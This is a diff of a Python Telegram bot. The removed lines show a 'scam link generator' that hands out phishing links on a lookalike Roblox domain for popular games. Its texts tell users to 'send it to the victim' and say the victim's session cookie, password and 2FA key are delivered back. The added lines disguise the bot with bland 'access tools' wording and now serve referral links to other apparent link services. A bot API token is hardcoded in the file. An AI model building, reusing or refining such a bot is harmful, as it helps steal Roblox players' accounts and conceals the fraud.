@@ -1,13 +1,18 @@
-from flask import Flask, request
+from flask import Flask
 import requests
 import os
 import json
+import time
+import threading
 import re
 
 app = Flask(__name__)
 
 BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
 ADMIN_CHAT_ID = "8625787020"
+
+# === ВСТАВЬ СЮДА СВОЙ FILE_ID ВИДЕО ===
+VIDEO_FILE_ID = "BAACAgEAAxkBAAP7akugXF318MJWQ3616dZDkwJJ4hkAAnEHAALuAmBGFLl3swomiE88BA"
 
 # === ФАЙЛЫ ===
 USERS_FILE = "users.json"
@@ -45,94 +50,30 @@ pending_reply = {}
 # === ТЕКСТЫ ===
 TEXTS = {
     "ru": {
-        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Выбери игру и получи готовую скам-ссылку.\n▸ Нажми на кнопку ниже.\n\n📌 *Полезные ссылки:*\n▸ TikTok с тутором: [@cookie_roflox](https://www.tiktok.com/@cookie_roflox)",
+        "welcome": "👋 *Привет!*\n\n▸ Этот бот поможет тебе получить доступ к инструментам.\n▸ Нажми на кнопку ниже, чтобы выбрать сервис.\n\n📌 *Всё просто — выбирай и переходи.*",
         "choose_action": "📌 *Выбери действие:*",
-        "game_list": (
-            "🎮 *Доступные игры:*\n"
-            "─────────────────\n"
-            "▸ Adopt Me\n▸ Murder Mystery 2\n▸ Blox Fruits\n"
-            "▸ Brookhaven RP\n▸ Pet Simulator 99\n▸ Toilet Tower Defense\n"
-            "▸ RIVALS\n▸ Grow a Garden 2\n▸ Steal a Brainrot\n"
-            "▸ +1 Speed Keyboard Escape"
-        ),
-        "link_sent": "🔗 *Ссылка для {}:*\n\n{}\n\n📌 *Отправь её жертве.*",
-        "about": (
-            "ℹ️ *О боте*\n\n"
-            "🔹 *Что делает этот бот?*\n"
-            "▸ Генерирует готовые скам-ссылки для популярных игр Roblox.\n\n"
-            "🔹 *Как это работает?*\n"
-            "▸ Жертва переходит по твоей ссылке и вводит свои данные.\n"
-            "▸ Всё, что она ввела — *приходит тебе сюда*.\n\n"
-            "🔹 *Какие данные приходят?*\n"
-            "▸ 🍪 .ROBLOSECURITY (куки)\n"
-            "▸ 👤 Логин / никнейм\n"
-            "▸ 🔑 Пароль\n"
-            "▸ 🔐 Ключ аутентификатора (2FA)\n\n"
-            "🔹 *Важно:*\n"
-            "▸ Используй только в образовательных целях.\n"
-            "▸ Ответственность за использование лежит на тебе."
-        ),
-        "support": "✍️ *Напиши свой запрос. Администратор ответит в ближайшее время.*",
+        "tutor": "📹 *Вот твой видео-тутор!*",
+        "about": "ℹ️ *О боте*\n\nПростой помощник для перехода на нужные сервисы.\n▸ Без сложностей\n▸ Без регистрации\n▸ Просто нажми и переходи",
         "choose_lang": "🌐 *Выбери язык:*",
         "lang_changed": "✅ *Язык изменён.*",
         "reply_sent": "✅ *Ответ отправлен*",
         "admin_reply": "📨 *Ответ администратора:*\n",
-        "no_user": "⚠️ *Зажми сообщение с ID пользователя → Ответить*",
-        "unknown_game": "⚠️ *Игра не найдена. Выбери из списка.*"
+        "no_user": "⚠️ *Зажми сообщение с ID пользователя → Ответить*"
     },
     "en": {
-        "welcome": "🔓 *LINK GENERATOR*\n\n▸ Choose a game and get a ready scam link.\n▸ Press the button below.\n\n📌 *Useful links:*\n▸ TikTok with tutorial: [@cookie_roflox](https://www.tiktok.com/@cookie_roflox)",
+        "welcome": "👋 *Hello!*\n\n▸ This bot helps you access tools.\n▸ Press the button below to choose a service.\n\n📌 *Simple — just choose and go.*",
         "choose_action": "📌 *Choose an action:*",
-        "game_list": (
-            "🎮 *Available games:*\n"
-            "─────────────────\n"
-            "▸ Adopt Me\n▸ Murder Mystery 2\n▸ Blox Fruits\n"
-            "▸ Brookhaven RP\n▸ Pet Simulator 99\n▸ Toilet Tower Defense\n"
-            "▸ RIVALS\n▸ Grow a Garden 2\n▸ Steal a Brainrot\n"
-            "▸ +1 Speed Keyboard Escape"
-        ),
-        "link_sent": "🔗 *Link for {}:*\n\n{}\n\n📌 *Send it to the victim.*",
-        "about": (
-            "ℹ️ *About the bot*\n\n"
-            "🔹 *What does this bot do?*\n"
-            "▸ Generates ready-made scam links for popular Roblox games.\n\n"
-            "🔹 *How does it work?*\n"
-            "▸ The victim clicks your link and enters their data.\n"
-            "▸ Everything they enter — *comes to you here*.\n\n"
-            "🔹 *What data comes?*\n"
-            "▸ 🍪 .ROBLOSECURITY (cookie)\n"
-            "▸ 👤 Login / username\n"
-            "▸ 🔑 Password\n"
-            "▸ 🔐 2FA key (authenticator)\n\n"
-            "🔹 *Important:*\n"
-            "▸ Use only for educational purposes.\n"
-            "▸ Responsibility for use lies with you."
-        ),
-        "support": "✍️ *Write your request. Admin will reply soon.*",
+        "tutor": "📹 *Here's your video tutorial!*",
+        "about": "ℹ️ *About the bot*\n\nSimple assistant for accessing services.\n▸ No complications\n▸ No registration\n▸ Just press and go",
         "choose_lang": "🌐 *Choose language:*",
         "lang_changed": "✅ *Language changed.*",
         "reply_sent": "✅ *Reply sent*",
         "admin_reply": "📨 *Admin reply:*\n",
-        "no_user": "⚠️ *Long press message with user ID → Reply*",
-        "unknown_game": "⚠️ *Game not found. Choose from the list.*"
+        "no_user": "⚠️ *Long press message with user ID → Reply*"
     }
 }
 
-# === ССЫЛКИ ПО ИГРАМ ===
-GAME_LINKS = {
-    "adopt me": "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=82337251021839787402749538321389",
-    "murder mystery 2": "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=82337251021839787402749538321389",
-    "blox fruits": "https://roblox.com.bz/games/2753915549/Blox-Fruits?privateServerLinkCode=82337251021839787402749538321389",
-    "brookhaven rp": "https://roblox.com.bz/games/4924922222/Brookhaven-RP?privateServerLinkCode=82337251021839787402749538321389",
-    "pet simulator 99": "https://roblox.com.bz/games/8737899170/WORLD-CUP-Pet-Simulator-99?privateServerLinkCode=82337251021839787402749538321389",
-    "toilet tower defense": "https://roblox.com.bz/games/13775256536/LEGACY-Toilet-Tower-Defense?privateServerLinkCode=82337251021839787402749538321389",
-    "rivals": "https://roblox.com.bz/games/17625359962/RIVALS?privateServerLinkCode=82337251021839787402749538321389",
-    "grow a garden 2": "https://roblox.com.bz/games/126884695634066/Grow-a-Garden?privateServerLinkCode=82337251021839787402749538321389",
-    "steal a brainrot": "https://roblox.com.bz/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=82337251021839787402749538321389",
-    "+1 speed keyboard escape": "https://roblox.com.bz/games/95082159892680/1-Speed-Keyboard-Escape-Candy-Chocolate?privateServerLinkCode=82337251021839787402749538321389"
-}
-
-# === КЛАВИАТУРЫ ===
+# === КНОПКИ ===
 LANG_KEYBOARD = {
     "keyboard": [
         ["🇷🇺 Русский", "🇬🇧 English"]
@@ -143,8 +84,8 @@ LANG_KEYBOARD = {
 
 MAIN_KEYBOARD_RU = {
     "keyboard": [
-        ["🔗 Создать ссылку", "ℹ️ О боте"],
-        ["🌐 Сменить язык"]
+        ["🔗 Создать ссылку", "📹 Тутор видео"],
+        ["ℹ️ О боте", "🌐 Сменить язык"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
@@ -152,365 +93,202 @@ MAIN_KEYBOARD_RU = {
 
 MAIN_KEYBOARD_EN = {
     "keyboard": [
-        ["🔗 Generate link", "ℹ️ About"],
-        ["🌐 Change language"]
+        ["🔗 Create link", "📹 Tutorial video"],
+        ["ℹ️ About", "🌐 Change language"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
 }
 
-GAME_KEYBOARD_RU = {
+SERVICE_KEYBOARD_RU = {
     "keyboard": [
-        ["Adopt Me", "Murder Mystery 2"],
-        ["Blox Fruits", "Brookhaven RP"],
-        ["Pet Simulator 99", "Toilet Tower Defense"],
-        ["RIVALS", "Grow a Garden 2"],
-        ["Steal a Brainrot", "+1 Speed Keyboard Escape"],
+        ["⚡ Immortal.st", "⚡ Shockify.st"],
         ["🔙 Назад"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
 }
 
-GAME_KEYBOARD_EN = {
+SERVICE_KEYBOARD_EN = {
     "keyboard": [
-        ["Adopt Me", "Murder Mystery 2"],
-        ["Blox Fruits", "Brookhaven RP"],
-        ["Pet Simulator 99", "Toilet Tower Defense"],
-        ["RIVALS", "Grow a Garden 2"],
-        ["Steal a Brainrot", "+1 Speed Keyboard Escape"],
+        ["⚡ Immortal.st", "⚡ Shockify.st"],
         ["🔙 Back"]
     ],
     "resize_keyboard": True,
     "one_time_keyboard": False
 }
 
-BACK_KEYBOARD_RU = {
-    "keyboard": [
-        ["🔙 Назад"]
-    ],
-    "resize_keyboard": True,
-    "one_time_keyboard": True
-}
+def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
+    requests.post(url, json=payload)
 
-BACK_KEYBOARD_EN = {
-    "keyboard": [
-        ["🔙 Back"]
-    ],
-    "resize_keyboard": True,
-    "one_time_keyboard": True
-}
+def send_link(chat_id, url, text="🔗 *Перейдите по ссылке:*"):
+    send_message(chat_id, f"{text}\n\n{url}")
+
+def get_updates(offset=None):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
+    params = {"timeout": 30, "allowed_updates": ["message"]}
+    if offset:
+        params["offset"] = offset
+    try:
+        r = requests.get(url, params=params, timeout=35)
+        return r.json().get("result", [])
+    except:
+        return []
+
+def poll():
+    offset = None
+    while True:
+        try:
+            updates = get_updates(offset)
+            for update in updates:
+                if "message" in update:
+                    msg = update["message"]
+                    chat_id = msg["chat"]["id"]
+                    text = msg.get("text", "")
+                    username = msg["from"].get("username", "anon")
+                    user_id = msg["from"]["id"]
+
+                    # === АДМИН: ответ через reply ===
+                    reply_to = msg.get("reply_to_message")
+                    if reply_to and str(chat_id) == ADMIN_CHAT_ID:
+                        reply_text = reply_to.get("text", "")
+                        match = re.search(r'ID:\s*(\d+)', reply_text)
+                        if match:
+                            target_id = int(match.group(1))
+                            lang = user_lang.get(str(target_id), "ru")
+                            send_message(target_id, TEXTS[lang]["admin_reply"] + text)
+                            send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* (ID: {target_id})")
+                            offset = update["update_id"] + 1
+                            continue
+
+                    # === АДМИН: команды ===
+                    if str(chat_id) == ADMIN_CHAT_ID:
+                        if text == '/users':
+                            send_message(ADMIN_CHAT_ID, f"👥 *Всего пользователей:* {len(USERS)}")
+                            offset = update["update_id"] + 1
+                            continue
+                        if text.startswith('/reply '):
+                            parts = text.split(" ", 2)
+                            if len(parts) >= 3 and parts[1].isdigit():
+                                target_id = int(parts[1])
+                                reply_text = parts[2]
+                                lang = user_lang.get(str(target_id), "ru")
+                                send_message(target_id, TEXTS[lang]["admin_reply"] + reply_text)
+                                send_message(ADMIN_CHAT_ID, f"✅ *Ответ отправлен* (ID: {target_id})")
+                            offset = update["update_id"] + 1
+                            continue
+                        if text.startswith('/sendall '):
+                            msg = text.replace("/sendall ", "")
+                            for uid in USERS:
+                                try:
+                                    send_message(uid, msg)
+                                except:
+                                    pass
+                            send_message(ADMIN_CHAT_ID, f"✅ *Рассылка отправлена* {len(USERS)} пользователям.")
+                            offset = update["update_id"] + 1
+                            continue
+
+                    # === ОБЫЧНЫЕ ПОЛЬЗОВАТЕЛИ ===
+                    save_user(user_id)
+                    lang = user_lang.get(str(user_id), "ru")
+                    t = TEXTS[lang]
+
+                    # Смена языка
+                    if text in ["🌐 Сменить язык", "🌐 Change language"]:
+                        send_message(chat_id, t["choose_lang"], LANG_KEYBOARD)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    if text == "🇷🇺 Русский":
+                        user_lang[str(user_id)] = "ru"
+                        save_lang()
+                        send_message(chat_id, TEXTS["ru"]["lang_changed"], MAIN_KEYBOARD_RU)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    if text == "🇬🇧 English":
+                        user_lang[str(user_id)] = "en"
+                        save_lang()
+                        send_message(chat_id, TEXTS["en"]["lang_changed"], MAIN_KEYBOARD_EN)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    # === НАЗАД ===
+                    if text in ["🔙 Назад", "🔙 Back"]:
+                        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                        send_message(chat_id, t["choose_action"], keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    # === КНОПКА "Создать ссылку" ===
+                    if text in ["🔗 Создать ссылку", "🔗 Create link"]:
+                        keyboard = SERVICE_KEYBOARD_EN if lang == "en" else SERVICE_KEYBOARD_RU
+                        send_message(chat_id, "⚡ *Выбери сервис:*", keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    # === ВЫБОР СЕРВИСА ===
+                    if text == "⚡ Immortal.st":
+                        send_link(chat_id, "https://immortal.st/?code=NzA2NTI5NTE4NDExMTQxMjYwNg==")
+                        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                        send_message(chat_id, t["choose_action"], keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    if text == "⚡ Shockify.st":
+                        send_link(chat_id, "https://shockify.st/?code=Mzc0NTc1NjEwNTMxNjIzNDQ2NA==")
+                        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                        send_message(chat_id, t["choose_action"], keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    # === ТУТОР (отправка ВИДЕО) ===
+                    if text in ["📹 Тутор видео", "📹 Tutorial video"]:
+                        requests.post(
+                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
+                            json={
+                                "chat_id": chat_id,
+                                "video": VIDEO_FILE_ID,
+                                "caption": t["tutor"]
+                            }
+                        )
+                        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                        send_message(chat_id, t["choose_action"], keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    # === О БОТЕ ===
+                    if text in ["ℹ️ О боте", "ℹ️ About"]:
+                        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                        send_message(chat_id, t["about"], keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    # === СТАРТ ===
+                    if text == '/start':
+                        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                        send_message(chat_id, t["welcome"], keyboard)
+                        offset = update["update_id"] + 1
+                        continue
+
+                    # === ВСЁ ОСТАЛЬНОЕ ===
+                    keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
+                    send_message(chat_id, t["choose_action"], keyboard)
+                    offset = update["update_id"] + 1
+
+        except Exception as e:
+            print("Polling error:", e)
+        time.sleep(1)
 
 @app.route('/')
 def home():
-    return "Bot is alive!", 200
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    global pending_reply
-    data = request.get_json()
-    
-    if data and 'message' in data:
-        chat_id = data['message']['chat']['id']
-        text = data['message'].get('text', '')
-        username = data['message']['from'].get('username', 'anon')
-        user_id = data['message']['from']['id']
-
-        # === АДМИН ===
-        if str(chat_id) == ADMIN_CHAT_ID:
-            reply_to = data['message'].get('reply_to_message')
-            if reply_to:
-                if pending_reply.get("user_id"):
-                    target_id = pending_reply["user_id"]
-                    target_lang = user_lang.get(str(target_id), "ru")
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": target_id,
-                            "text": TEXTS[target_lang]["admin_reply"] + text,
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": ADMIN_CHAT_ID,
-                            "text": f"✅ *Ответ отправлен* @{pending_reply.get('username', 'anon')}",
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                    pending_reply = {}
-                    return "ok", 200
-                else:
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": ADMIN_CHAT_ID,
-                            "text": "⚠️ *Не удалось найти пользователя для ответа.*",
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                    return "ok", 200
-
-            if text.startswith("/reply "):
-                parts = text.split(" ", 2)
-                if len(parts) >= 3 and parts[1].isdigit():
-                    target_id = int(parts[1])
-                    reply_text = parts[2]
-                    target_lang = user_lang.get(str(target_id), "ru")
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": target_id,
-                            "text": TEXTS[target_lang]["admin_reply"] + reply_text,
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": ADMIN_CHAT_ID,
-                            "text": f"✅ *Ответ отправлен* (ID: {target_id})",
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                    return "ok", 200
-                else:
-                    requests.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                        json={
-                            "chat_id": ADMIN_CHAT_ID,
-                            "text": "⚠️ *Используй:* `/reply ID Текст`",
-                            "parse_mode": "Markdown"
-                        }
-                    )
-                    return "ok", 200
-
-            if text and not text.startswith("/"):
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={
-                        "chat_id": ADMIN_CHAT_ID,
-                        "text": TEXTS["ru"]["no_user"],
-                        "parse_mode": "Markdown"
-                    }
-                )
-                return "ok", 200
-
-            if text == '/start':
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={
-                        "chat_id": ADMIN_CHAT_ID,
-                        "text": "👋 *Привет, админ!*\n\n▸ Бот работает\n▸ Зажми сообщение → Ответить\n▸ Используй /help",
-                        "parse_mode": "Markdown",
-                        "reply_markup": MAIN_KEYBOARD_RU
-                    }
-                )
-                return "ok", 200
-
-            if text == '/help':
-                help_text = (
-                    "📋 *Команды:*\n\n"
-                    "/help — помощь\n"
-                    "/users — количество пользователей\n"
-                    "/reply ID Текст — ответить\n"
-                    "/sendall Текст — рассылка\n\n"
-                    "📌 *Зажми сообщение → Ответить*"
-                )
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={
-                        "chat_id": ADMIN_CHAT_ID,
-                        "text": help_text,
-                        "parse_mode": "Markdown"
-                    }
-                )
-                return "ok", 200
-
-            if text == '/users':
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={
-                        "chat_id": ADMIN_CHAT_ID,
-                        "text": f"👥 *Всего пользователей:* {len(USERS)}",
-                        "parse_mode": "Markdown"
-                    }
-                )
-                return "ok", 200
-
-            if text.startswith("/sendall "):
-                msg = text.replace("/sendall ", "")
-                for uid in USERS:
-                    try:
-                        requests.post(
-                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                            json={"chat_id": uid, "text": msg}
-                        )
-                    except:
-                        pass
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={
-                        "chat_id": ADMIN_CHAT_ID,
-                        "text": f"✅ *Рассылка отправлена* {len(USERS)} пользователям.",
-                        "parse_mode": "Markdown"
-                    }
-                )
-                return "ok", 200
-
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": ADMIN_CHAT_ID,
-                    "text": TEXTS["ru"]["no_user"],
-                    "parse_mode": "Markdown"
-                }
-            )
-            return "ok", 200
-
-        # === ПОЛЬЗОВАТЕЛЬ ===
-        save_user(user_id)
-        lang = user_lang.get(str(user_id), "ru")
-        t = TEXTS[lang]
-
-        # Смена языка
-        if text in ["🌐 Сменить язык", "🌐 Change language"]:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": t["choose_lang"],
-                    "reply_markup": LANG_KEYBOARD
-                }
-            )
-            return "ok", 200
-
-        if text == "🇷🇺 Русский":
-            user_lang[str(user_id)] = "ru"
-            save_lang()
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": TEXTS["ru"]["lang_changed"],
-                    "parse_mode": "Markdown",
-                    "reply_markup": MAIN_KEYBOARD_RU
-                }
-            )
-            return "ok", 200
-
-        if text == "🇬🇧 English":
-            user_lang[str(user_id)] = "en"
-            save_lang()
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": TEXTS["en"]["lang_changed"],
-                    "parse_mode": "Markdown",
-                    "reply_markup": MAIN_KEYBOARD_EN
-                }
-            )
-            return "ok", 200
-
-        # === ОТПРАВКА СООБЩЕНИЙ АДМИНУ ===
-        pending_reply = {"user_id": user_id, "username": username}
-
-        requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={
-                "chat_id": ADMIN_CHAT_ID,
-                "text": f"@{username}",
-                "parse_mode": "Markdown"
-            }
-        )
-
-        requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={
-                "chat_id": ADMIN_CHAT_ID,
-                "text": text,
-                "parse_mode": "Markdown"
-            }
-        )
-
-        # === ОБРАБОТКА КНОПОК ===
-        keyboard = MAIN_KEYBOARD_EN if lang == "en" else MAIN_KEYBOARD_RU
-        game_keyboard = GAME_KEYBOARD_EN if lang == "en" else GAME_KEYBOARD_RU
-        back_keyboard = BACK_KEYBOARD_EN if lang == "en" else BACK_KEYBOARD_RU
-
-        if text in ["🔗 Создать ссылку", "🔗 Generate link"]:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": t["game_list"],
-                    "parse_mode": "Markdown",
-                    "reply_markup": game_keyboard
-                }
-            )
-
-        elif text in ["ℹ️ О боте", "ℹ️ About"]:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": t["about"],
-                    "parse_mode": "Markdown",
-                    "reply_markup": keyboard
-                }
-            )
-
-        elif text in ["🔙 Назад", "🔙 Back"]:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": t["choose_action"],
-                    "parse_mode": "Markdown",
-                    "reply_markup": keyboard
-                }
-            )
-
-        elif text.lower() in GAME_LINKS:
-            game_name = text.lower()
-            link = GAME_LINKS[game_name]
-            display_name = text.title() if lang == "en" else text
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": t["link_sent"].format(display_name, link),
-                    "parse_mode": "Markdown",
-                    "reply_markup": game_keyboard
-                }
-            )
-
-        elif text == '/start':
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": t["welcome"],
-                    "parse_mode": "Markdown",
-                    "reply_markup": keyboard
-                }
-            )
-
-        else:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={
-                    "chat_id": chat_id,
-                    "text": t["choose_action"],
-                    "parse_mode": "Markdown",
-                    "reply_markup": keyboard
-                }
-            )
-
-    return "ok", 200
+    return "Bot is alive! (polling mode)", 200
 
 if __name__ == "__main__":
+    threading.Thread(target=poll, daemon=True).start()
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
